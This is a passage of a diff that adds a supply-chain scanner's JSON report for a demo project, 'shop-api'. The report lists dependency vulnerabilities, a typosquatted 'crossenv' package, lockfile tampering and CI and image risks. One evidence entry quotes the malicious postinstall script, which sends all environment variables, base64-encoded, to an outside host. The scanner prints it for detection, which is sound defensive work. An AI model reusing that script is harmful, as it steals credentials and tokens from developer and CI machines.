+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 95,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 75,
+          "why": "CVSS 7.5"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": 5,
+          "why": "pulled in by a dependency that production code imports: pulled in by 'express', which production code imports (server.js)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.85,
+        "label": "high",
+        "reasons": [
+          "version match only; vulnerable function use not proven"
+        ]
+      },
+      "reachability": {
+        "level": "parent-imported",
+        "detail": "pulled in by 'express', which production code imports (server.js)",
+        "files": [
+          "server.js"
+        ],
+        "via": "express"
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "0.1.10"
+        ],
+        "available": true,
+        "introduced_via": [
+          "express@4.17.1"
+        ],
+        "cvss_score": 7.5,
+        "cwe": [
+          "CWE-1333"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "express@4.17.1",
+          "path-to-regexp@0.1.7"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known vulnerability in path-to-regexp@0.1.7: path-to-regexp outputs backtracking regular expressions. It enters the app via shop-api@1.4.0 > express@4.17.1 > path-to-regexp@0.1.7. A fixed version exists (0.1.10).",
+        "exploitability": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)",
+        "reachability": "parent-imported: pulled in by 'express', which production code imports (server.js). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [
+          "whether the vulnerable function is actually called (function-level reachability)"
+        ],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-1f7ff0a614",
+      "title": "Known vulnerability in path-to-regexp@0.1.7: path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/path-to-regexp@0.1.7",
+        "name": "path-to-regexp",
+        "version": "0.1.7",
+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 95,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 75,
+          "why": "CVSS 7.5"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": 5,
+          "why": "pulled in by a dependency that production code imports: pulled in by 'express', which production code imports (server.js)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.85,
+        "label": "high",
+        "reasons": [
+          "version match only; vulnerable function use not proven"
+        ]
+      },
+      "reachability": {
+        "level": "parent-imported",
+        "detail": "pulled in by 'express', which production code imports (server.js)",
+        "files": [
+          "server.js"
+        ],
+        "via": "express"
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "0.1.13"
+        ],
+        "available": true,
+        "introduced_via": [
+          "express@4.17.1"
+        ],
+        "cvss_score": 7.5,
+        "cwe": [
+          "CWE-1333"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "express@4.17.1",
+          "path-to-regexp@0.1.7"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known vulnerability in path-to-regexp@0.1.7: path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters. It enters the app via shop-api@1.4.0 > express@4.17.1 > path-to-regexp@0.1.7. A fixed version exists (0.1.13).",
+        "exploitability": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)",
+        "reachability": "parent-imported: pulled in by 'express', which production code imports (server.js). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [
+          "whether the vulnerable function is actually called (function-level reachability)"
+        ],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-c83abdd646",
+      "title": "Known vulnerability in qs@6.7.0: qs vulnerable to Prototype Pollution",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/qs@6.7.0",
+        "name": "qs",
+        "version": "6.7.0",
+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 95,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 75,
+          "why": "CVSS 7.5"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": 5,
+          "why": "pulled in by a dependency that production code imports: pulled in by 'express', which production code imports (server.js)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.85,
+        "label": "high",
+        "reasons": [
+          "version match only; vulnerable function use not proven"
+        ]
+      },
+      "reachability": {
+        "level": "parent-imported",
+        "detail": "pulled in by 'express', which production code imports (server.js)",
+        "files": [
+          "server.js"
+        ],
+        "via": "express"
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "6.7.3"
+        ],
+        "available": true,
+        "introduced_via": [
+          "express@4.17.1"
+        ],
+        "cvss_score": 7.5,
+        "cwe": [
+          "CWE-1321"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "express@4.17.1",
+          "qs@6.7.0"
+        ],
+        [
+          "shop-api@1.4.0",
+          "express@4.17.1",
+          "body-parser@1.19.0",
+          "qs@6.7.0"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known vulnerability in qs@6.7.0: qs vulnerable to Prototype Pollution. It enters the app via shop-api@1.4.0 > express@4.17.1 > body-parser@1.19.0 > qs@6.7.0. A fixed version exists (6.7.3).",
+        "exploitability": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)",
+        "reachability": "parent-imported: pulled in by 'express', which production code imports (server.js). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [
+          "whether the vulnerable function is actually called (function-level reachability)"
+        ],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-d59b7c1df8",
+      "title": "Suspicious install script in crossenv@6.1.1",
+      "category": "install-script",
+      "rule": "INSTALL-SCRIPT",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/crossenv@6.1.1",
+        "name": "crossenv",
+        "version": "6.1.1",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "dev"
+      },
+      "score": 95,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 90,
+          "why": "detector severity 'critical'"
+        },
+        {
+          "factor": "exposure",
+          "points": 5,
+          "why": "executes at install time on developer and CI machines (scope does not reduce this)"
+        }
+      ],
+      "confidence": {
+        "value": 0.55,
+        "label": "low",
+        "reasons": [
+          "finding is pattern-based (heuristic)",
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'crossenv' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "dev-tooling",
+        "production": false,
+        "detail": "devDependency: not installed in production"
+      },
+      "production": false,
+      "fix": {
+        "suggestion": "install with --ignore-scripts and allowlist required builds; pin version"
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "crossenv@6.1.1"
+        ]
+      ],
+      "ai": null
+    },
+    {
+      "finding_id": "GRD-575e3b161a",
+      "title": "Known vulnerability in node-fetch@2.6.0: node-fetch forwards secure headers to untrusted sites",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/node-fetch@2.6.0",
+        "name": "node-fetch",
+        "version": "2.6.0",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 88,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 88,
+          "why": "CVSS 8.8"
+        },
+        {
+          "factor": "reachability",
+          "points": -10,
+          "why": "no import found (weak evidence: may be loaded dynamically or via CLI): 'node-fetch' not imported but referenced in package.json (CLI / config use)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.75,
+        "label": "medium",
+        "reasons": [
+          "version match only; vulnerable function use not proven",
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'node-fetch' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "2.6.7"
+        ],
+        "available": true,
+        "introduced_via": [
+          "node-fetch@2.6.0"
+        ],
+        "cvss_score": 8.8,
+        "cwe": [
+          "CWE-173",
+          "CWE-200",
+          "CWE-601"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "node-fetch@2.6.0"
+        ]
+      ],
+      "ai": null
+    },
+    {
+      "finding_id": "GRD-ad2936893a",
+      "title": "Known vulnerability in lodash@4.17.15: lodash vulnerable to Code Injection via `_.template` imports key names",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/lodash@4.17.15",
+        "name": "lodash",
+        "version": "4.17.15",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 86,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 81,
+          "why": "CVSS 8.1"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": -10,
+          "why": "no import found (weak evidence: may be loaded dynamically or via CLI): 'lodash' not imported but referenced in package.json (CLI / config use)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.75,
+        "label": "medium",
+        "reasons": [
+          "version match only; vulnerable function use not proven",
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'lodash' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "4.18.0"
+        ],
+        "available": true,
+        "introduced_via": [
+          "lodash@4.17.15"
+        ],
+        "cvss_score": 8.1,
+        "cwe": [
+          "CWE-94"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "lodash@4.17.15"
+        ]
+      ],
+      "ai": null
+    },
+    {
+      "finding_id": "GRD-844e5ccc16",
+      "title": "Known vulnerability in lodash@4.17.15: Prototype Pollution in lodash",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/lodash@4.17.15",
+        "name": "lodash",
+        "version": "4.17.15",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 79,
+      "priority": "P2-high",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 74,
+          "why": "CVSS 7.4"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": -10,
+          "why": "no import found (weak evidence: may be loaded dynamically or via CLI): 'lodash' not imported but referenced in package.json (CLI / config use)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.75,
+        "label": "medium",
+        "reasons": [
+          "version match only; vulnerable function use not proven",
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'lodash' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "4.17.19"
+        ],
+        "available": true,
+        "introduced_via": [
+          "lodash@4.17.15"
+        ],
+        "cvss_score": 7.4,
+        "cwe": [
+          "CWE-770",
+          "CWE-1321"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "lodash@4.17.15"
+        ]
+      ],
+      "ai": null
+    },
+    {
+      "finding_id": "GRD-0bd24c48d9",
+      "title": "Known vulnerability in express@4.17.1: Express.js Open Redirect in malformed URLs",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "medium",
+      "component": {
+        "id": "pkg:npm/express@4.17.1",
+        "name": "express",
+        "version": "4.17.1",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 76,
+      "priority": "P2-high",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 61,
+          "why": "CVSS 6.1"
+        },
+        {
+          "factor": "exploitability",
+          "points": -5,
+          "why": "needs user interaction (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)"
+        },
+        {
+          "factor": "reachability",
+          "points": 10,
+          "why": "vulnerable package is imported directly by production code: imported directly by 1 production source file(s)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.85,
+        "label": "high",
+        "reasons": [
+          "version match only; vulnerable function use not proven"
+        ]
+      },
+      "reachability": {
+        "level": "imported",
+        "detail": "imported directly by 1 production source file(s)",
+        "files": [
+          "server.js"
+        ]
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "4.19.2"
+        ],
+        "available": true,
+        "introduced_via": [
+          "express@4.17.1"
+        ],
+        "cvss_score": 6.1,
+        "cwe": [
+          "CWE-601",
+          "CWE-1286"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "express@4.17.1"
+        ]
+      ],
+      "ai": null
+    },
+    {
+      "finding_id": "GRD-09f992c3b6",
+      "title": "Dockerfile: RUN pipes a downloaded script into a shell",
+      "category": "untrusted-image",
+      "rule": "IMAGE-PIPE-TO-SHELL",
+      "severity": "high",
+      "component": null,
+      "score": 75,
+      "priority": "P2-high",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 70,
+          "why": "detector severity 'high'"
+        },
+        {
+          "factor": "exposure",
+          "points": 5,
+          "why": "part of a shipped container image (defined in Dockerfile)"
+        }
+      ],
+      "confidence": {
+        "value": 0.9,
+        "label": "high",
+        "reasons": [
+          "verified advisory + exact version + reachability evidence"
+        ]
+      },
+      "reachability": {
+        "level": "n/a",
+        "detail": "finding is about a file, not a package",
+        "files": []
+      },
+      "exposure": {
+        "context": "runtime-image",
+        "production": true,
+        "detail": "defined in Dockerfile"
+      },
+      "production": true,
+      "fix": null,
+      "dependency_paths": [],
+      "ai": null
+    },
+    {
+      "finding_id": "GRD-cbacc02b07",
+      "title": "Download source for minimist@1.2.5 changed: registry.npmjs.org -> registry.npmjs-cdn.com",
+      "category": "integrity",
+      "rule": "CHANGE-SOURCE",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/minimist@1.2.5",
+        "name": "minimist",
+        "version": "1.2.5",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 75,
+      "priority": "P2-high",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 70,
+          "why": "detector severity 'high'"
+        },
+        {
+          "factor": "exposure",
+          "points": 5,
+          "why": "executes at install time on developer and CI machines (scope does not reduce this)"
+        }
+      ],
+      "confidence": {
+        "value": 0.8,
+        "label": "high",
+        "reasons": [
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'minimist' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": null,
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "minimist@1.2.5"
+        ]
+      ],
+      "ai": null
+    },
+    {
+      "finding_id": "GRD-04410445f6",
+      "title": "GitHub Action quick-actions/npm-cache: branch/unversioned ref 'main' (code changes on every run)",
+      "category": "cicd",
+      "rule": "CICD-UNPINNED-ACTION",
+      "severity": "high",
+      "component": {
+        "id": "pkg:githubactions/quick-actions/npm-cache@main",
+        "name": "quick-actions/npm-cache",
+        "version": "main",
+        "ecosystem": "github-actions",
+        "direct": true,
+        "scope": "ci"
+      },
+      "score": 75,
+      "priority": "P2-high",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 70,
+          "why": "detector severity 'high'"
+        },
+        {
+          "factor": "exposure",
+          "points": 5,
+          "why": "runs in CI with access to repository secrets (runs in CI with access to repository tokens/secrets)"
+        }
+      ],
+      "confidence": {
+        "value": 0.9,
+        "label": "high",
+        "reasons": [
+          "verified advisory + exact version + reachability evidence"
+        ]
+      },
+      "reachability": {
+        "level": "n/a",
+        "detail": "not a code library (image / CI component)",
+        "files": []
+      },
+      "exposure": {
+        "context": "ci-pipeline",
+        "production": false,
+        "detail": "runs in CI with access to repository tokens/secrets"
+      },
+      "production": false,
+      "fix": {
+        "suggestion": "pin to a full commit SHA: uses: quick-actions/npm-cache@<40-char-sha> # main"
+      },
+      "dependency_paths": [],
+      "ai": null
+    },
+    {
+      "finding_id": "GRD-a0dfadd0ab",
+      "title": "Image 'fastbuilds/node-runtime' comes from a non-allowlisted publisher (docker.io)",
+      "category": "untrusted-image",
+      "rule": "IMAGE-UNTRUSTED-SOURCE",
+      "severity": "high",
+      "component": {
+        "id": "pkg:docker/fastbuilds/node-runtime@18",
+        "name": "fastbuilds/node-runtime",
+        "version": "18",
+        "ecosystem": "docker",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 75,
+      "priority": "P2-high",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 70,
+          "why": "detector severity 'high'"
+        },
+        {
+          "factor": "exposure",
+          "points": 5,
+          "why": "part of a shipped container image (base image of a shipped container)"
+        }
+      ],
+      "confidence": {
+        "value": 0.85,
+        "label": "high",
+        "reasons": [
+          "verified advisory + exact version + reachability evidence"
+        ]
+      },
+      "reachability": {
+        "level": "n/a",
+        "detail": "not a code library (image / CI component)",
+        "files": []
+      },
+      "exposure": {
+        "context": "runtime-image",
+        "production": true,
+        "detail": "base image of a shipped container"
+      },
+      "production": true,
+      "fix": {
+        "suggestion": "use an official / verified-publisher image or add the publisher to the allowlist after review"
+      },
+      "dependency_paths": [],
+      "ai": null
+    },
+    {
+      "finding_id": "GRD-46055a5e2c",
+      "title": "Lockfile root declares 'debug-helper-utils' which is not in package.json",
+      "category": "unexpected-dependency",
+      "rule": "UNEXPECTED-LOCK-ONLY-DEP",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/debug-helper-utils@1.0.2",
+        "name": "debug-helper-utils",
+        "version": "1.0.2",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 75,
+      "priority": "P2-high",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 70,
+          "why": "detector severity 'high'"
+        },
+        {
+          "factor": "exposure",
+          "points": 5,
+          "why": "executes at install time on developer and CI machines (scope does not reduce this)"
+        }
+      ],
+      "confidence": {
+        "value": 0.8,
+        "label": "high",
+        "reasons": [
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "no import of debug-helper-utils found; may still be loaded dynamically",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "suggestion": "lockfile was edited outside npm or is out of sync; regenerate and review the diff"
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "debug-helper-utils@1.0.2"
+        ]
+      ],
+      "ai": null
+    }
+  ],
+  "investigations": [
+    {
+      "schema": "guardian.investigation/v1",
+      "finding": {
+        "id": "GRD-704d795f51",
+        "rule": "CHANGE-INTEGRITY",
+        "category": "integrity",
+        "title": "Integrity hash changed for unchanged version lodash@4.17.15",
+        "severity": "critical"
+      },
+      "component": {
+        "id": "pkg:npm/lodash@4.17.15",
+        "name": "lodash",
+        "version": "4.17.15",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "generated_at": "2026-11-24T04:54:29Z",
+      "verified_evidence": [
+        {
+          "id": "F1",
+          "kind": "sbom-diff",
+          "source": "demo/baseline/package-lock.json",
+          "detail": "baseline integrity: sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE2QGoeQmb..."
+        },
+        {
+          "id": "F2",
+          "kind": "lockfile-entry",
+          "source": "package-lock.json:node_modules/lodash",
+          "detail": "current integrity: sha512-WJAEnrj+gB2oUrTvMs/hGDhnO9wWZDAUwbYwgNb3E..."
+        },
+        {
+          "id": "F3",
+          "kind": "dependency-path",
+          "source": "dependency graph",
+          "detail": "shop-api@1.4.0 > lodash@4.17.15"
+        },
+        {
+          "id": "F4",
+          "kind": "baseline-diff",
+          "source": "baseline vs current",
+          "detail": "version unchanged: 4.17.15"
+        },
+        {
+          "id": "F5",
+          "kind": "baseline-diff",
+          "source": "baseline vs current",
+          "detail": "integrity: sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE2QGoeQmbKmRS6J3VQppPOIt0MnmE+4xlZoumy0GPG0D0MVIQbN -> sha512-WJAEnrj+gB2oUrTvMs/hGDhnO9wWZDAUwbYwgNb3EUuzGyEBdHyxxUQKN2kqJqY/EEWBKv71jtRWGlRR1Nt"
+        },
+        {
+          "id": "F6",
+          "kind": "manifest",
+          "source": "package.json",
+          "detail": "declared as lodash: 4.17.15 (dependencies)"
+        },
+        {
+          "id": "F7",
+          "kind": "registry",
+          "source": "registry.npmjs.org",
+          "detail": "latest dist-tag: 4.18.1; 117 versions published"
+        },
+        {
+          "id": "F8",
+          "kind": "registry",
+          "source": "registry.npmjs.org",
+          "detail": "package first published 2012-04-23"
+        },
+        {
+          "id": "F9",
+          "kind": "registry",
+          "source": "registry.npmjs.org",
+          "detail": "version 4.17.15 published 2019-07-19"
+        },
+        {
+          "id": "F10",
+          "kind": "provenance",
+          "source": "registry.npmjs.org",
+          "detail": "no npm provenance attestation for 4.17.15 (build origin not verifiable)"
+        },
+        {
+          "id": "F11",
+          "kind": "registry",
+          "source": "registry.npmjs.org",
+          "detail": "version published by npm user 'jdalton'"
+        },
+        {
+          "id": "F12",
+          "kind": "provenance",
+          "source": "registry.npmjs.org",
+          "detail": "source repository: git+https://github.com/lodash/lodash.git"
+        },
+        {
+          "id": "F13",
+          "kind": "git-history",
+          "source": "git log package-lock.json",
+          "detail": "no history available (shallow clone or untracked file)"
+        }
+      ],
+      "inference": {
+        "by": "rule-based",
+        "hypothesis": "The same version now has different bytes than before, which points to lockfile tampering or a compromised mirror.",
+        "assessment": "Rule-based inference from the verified facts; no AI model was used.",
+        "verdict": "suspicious",
+        "cited_facts": [
+          "F1",
+          "F2",
+          "F3",
+          "F4",
+          "F5",
+          "F6"
+        ],
+        "missing_evidence": [],
+        "next_steps": [
+          "block the component in policy until reviewed",
+          "restore from the trusted baseline / pin to a reviewed commit",
+          "escalate to security review"
+        ],
+        "confidence": "medium"
+      },
+      "note": "verified_evidence comes from deterministic sources; inference is model/rule output and must be reviewed"
+    },
+    {
+      "schema": "guardian.investigation/v1",
+      "finding": {
+        "id": "GRD-d2c4aa3ad1",
+        "rule": "TYPOSQUAT",
+        "category": "typosquat",
+        "title": "Possible typosquat: 'crossenv' looks like 'cross-env'",
+        "severity": "high"
+      },
+      "component": {
+        "id": "pkg:npm/crossenv@6.1.1",
+        "name": "crossenv",
+        "version": "6.1.1",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "dev"
+      },
+      "generated_at": "2026-11-24T04:54:29Z",
+      "verified_evidence": [
+        {
+          "id": "F1",
+          "kind": "name-similarity",
+          "source": "guardian popular-package list:node_modules/crossenv",
+          "detail": "'crossenv' resembles popular package 'cross-env' (same name after separator/homoglyph normalisation)"
+        },
+        {
+          "id": "F2",
+          "kind": "context",
+          "source": "inventory",
+          "detail": "the legitimate 'cross-env' is also in this dependency tree"
+        },
+        {
+          "id": "F3",
+          "kind": "install-script",
+          "source": "package-lock.json",
+          "detail": "package runs an install-time script (hasInstallScript)"
+        },
+        {
+          "id": "F4",
+          "kind": "registry-metadata",
+          "source": "registry.npmjs.org",
+          "detail": "npm replaced this package with a security holding placeholder (latest = 0.0.2-security); this happens when a package is removed for malicious code"
+        },
+        {
+          "id": "F5",
+          "kind": "dependency-path",
+          "source": "dependency graph",
+          "detail": "shop-api@1.4.0 > crossenv@6.1.1"
+        },
+        {
+          "id": "F6",
+          "kind": "baseline-diff",
+          "source": "baseline",
+          "detail": "'crossenv' did not exist in the trusted baseline; it is new"
+        },
+        {
+          "id": "F7",
+          "kind": "manifest",
+          "source": "package.json",
+          "detail": "declared as crossenv: ^6.1.1 (devDependencies)"
+        },
+        {
+          "id": "F8",
+          "kind": "install-script",
+          "source": "node_modules/crossenv/package.json",
+          "detail": "postinstall: node -e \"require('http').request({host:'npm.hacktask.net',path:'/log/?'+Buffer.from(JSON.stringify(process.env)).toString('base64')}).end()\""
+        },
+        {
+          "id": "F9",
+          "kind": "registry",
+          "source": "registry.npmjs.org",
+          "detail": "latest dist-tag: 0.0.2-security; 4 versions published"
+        },
+        {
+          "id": "F10",
+          "kind": "registry",
+          "source": "registry.npmjs.org",
+          "detail": "package has been replaced by an npm security placeholder (taken down)"
+        },
+        {
+          "id": "F11",
+          "kind": "registry",
+          "source": "registry.npmjs.org",
+          "detail": "package first published 2017-07-19"
+        },
+        {
+          "id": "F12",
+          "kind": "registry",
+          "source": "registry.npmjs.org",
+          "detail": "version 6.1.1 published 2017-07-19"
+        },
+        {
+          "id": "F13",
+          "kind": "registry",
+          "source": "registry.npmjs.org",
+          "detail": "version 6.1.1 is not available on the registry"
+        },
+        {
+          "id": "F14",
+          "kind": "provenance",
+          "source": "registry.npmjs.org",
+          "detail": "source repository: git+https://github.com/npm/security-holder.git"
+        },
+        {
+          "id": "F15",
+          "kind": "git-history",
+          "source": "git log package-lock.json",
+          "detail": "no history available (shallow clone or untracked file)"
+        }
+      ],
+      "inference": {
+        "by": "rule-based",
+        "hypothesis": "The package matches known-malicious signals (registry take-down and/or data-exfiltration script).",
+        "assessment": "Rule-based inference from the verified facts; no AI model was used.",
+        "verdict": "likely-malicious",
+        "cited_facts": [
+          "F1",
+          "F2",
+          "F3",
+          "F4",
+          "F5",
+          "F6"
+        ],
+        "missing_evidence": [],
+        "next_steps": [
+          "block the component in policy until reviewed",
+          "restore from the trusted baseline / pin to a reviewed commit",
+          "escalate to security review"
+        ],
+        "confidence": "medium"
+      },
+      "note": "verified_evidence comes from deterministic sources; inference is model/rule output and must be reviewed"
+    }
+  ],
+  "plan": {
+    "schema": "guardian.plan/v1",
+    "project": "shop-api@1.4.0",
+    "items": [
+      {
+        "item_id": "R1",
+        "title": "lodash@4.17.15: integrity, vulnerability",
+        "priority": "P1-urgent",
+        "score": 100,
+        "findings": [
+          "GRD-704d795f51",
+          "GRD-21c00fec6e",
+          "GRD-ad2936893a",
+          "GRD-844e5ccc16",
+          "GRD-a128fcec7d",
+          "GRD-e21d6bab29"
+        ],
+        "categories": [
+          "integrity",
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/lodash@4.17.15",
+          "name": "lodash",
+          "version": "4.17.15",
+          "ecosystem": "npm",
+          "direct": true,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "lodash@4.17.15"
+          ]
+        ],
+        "reachability": {
+          "level": "unknown",
+          "detail": "'lodash' not imported but referenced in package.json (CLI / config use)",
+          "files": []
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
